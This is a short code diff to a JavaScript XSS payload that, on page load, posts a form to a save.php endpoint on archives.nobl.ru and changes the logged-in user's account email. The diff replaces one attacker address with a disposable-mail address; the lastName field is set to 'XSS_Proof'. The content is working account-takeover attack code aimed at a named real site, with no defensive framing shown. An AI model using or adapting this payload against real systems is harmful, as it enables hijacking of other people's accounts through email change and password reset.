@@ -25,7 +25,7 @@ function changeEmail(newEmail) {
   formData.append('values[lastName]', 'XSS_Proof');
   formData.append('values[login]', 'test3');
   formData.append('values[secondName]', '');
-  formData.append('values[email]', 'youhacked@wow.ru');
+  formData.append('values[email]', 'vzh37@tempmaila.org');
 
   fetch('https://archives.nobl.ru/local/templates/g3/components/openregion/user/.default/http/save.php', {
     method: 'POST',
@@ -49,5 +49,5 @@ function changeEmail(newEmail) {
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  changeEmail('youhacked@wow.ru');
+  changeEmail('vzh37@tempmaila.org');
 });
